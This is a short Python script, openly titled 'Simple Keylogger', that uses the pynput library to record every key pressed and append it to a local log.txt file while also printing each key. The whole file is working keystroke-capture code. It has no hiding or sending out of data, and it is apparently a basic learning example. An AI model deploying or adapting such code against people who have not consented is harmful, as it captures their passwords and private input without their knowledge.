from pynput import keyboard

print("Simple Keylogger")

# Function to handle key press events.
def on_press(key):
    # print key pressed
    print(f'Pressed: {key}')
    with open("log.txt", "a") as keylog:
        try:
            keylog.write(f'{key}\n')
        except:
            print("Error writing to keylog file.")

if __name__ == '__main__':
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    input()